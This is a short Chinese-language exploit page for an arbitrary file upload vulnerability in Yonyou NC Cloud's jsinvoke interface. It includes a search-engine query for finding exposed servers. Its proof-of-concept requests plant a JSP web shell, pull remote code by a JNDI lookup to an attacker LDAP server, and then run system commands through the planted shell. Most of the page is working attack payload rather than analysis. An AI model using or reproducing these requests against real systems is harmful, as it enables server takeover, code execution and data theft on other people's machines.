# 用友 NC Cloud jsinvoke 任意文件上传漏洞

## 漏洞描述

用友 NC Cloud jsinvoke 接口存在任意文件上传漏洞，攻击者通过漏洞可以上传任意文件至服务器中，获取系统权限

## 漏洞影响

<a-checkbox checked>用友 NC Cloud</a-checkbox></br>

## 网络测绘

<a-checkbox checked>app="用友-NC-Cloud"</a-checkbox></br>

## 漏洞复现

登陆页面

![img](../../../.vuepress/public/img/1677729078033-1536313c-bfb8-4134-ac84-ddad2b011207-20230809133642723.png)

验证POC

```plain
POST /uapjs/jsinvoke/?action=invoke
Content-Type: application/json

{
    "serviceName":"nc.itf.iufo.IBaseSPService",
    "methodName":"saveXStreamConfig",
    "parameterTypes":[
        "java.lang.Object",
        "java.lang.String"
    ], 
    "parameters":[
        "${param.getClass().forName(param.error).newInstance().eval(param.cmd)}",
        "webapps/nc_web/407.jsp"
    ]
}
POST /uapjs/jsinvoke/?action=invoke HTTP/1.1
Host: 
Connection: Keep-Alive
Content-Length: 253
Content-Type: application/x-www-form-urlencoded


{"serviceName":"nc.itf.iufo.IBaseSPService","methodName":"saveXStreamConfig","parameterTypes":["java.lang.Object","java.lang.String"],"parameters":["${''.getClass().forName('javax.naming.InitialContext').newInstance().lookup('ldap://VPSip:1389/TomcatBypass/TomcatEcho')}","webapps/nc_web/301.jsp"]}
```

![img](../../../.vuepress/public/img/1677729129558-fd90f34f-9bb9-44ce-b779-e7c17578b4a0.png)

```plain
/cmdtest.jsp?error=bsh.Interpreter&cmd=org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec(%22whoami%22).getInputStream()) 
```

![img](../../../.vuepress/public/img/1677729209203-afb4acf2-bd48-44fb-af97-aa70c9bcbc2a.png)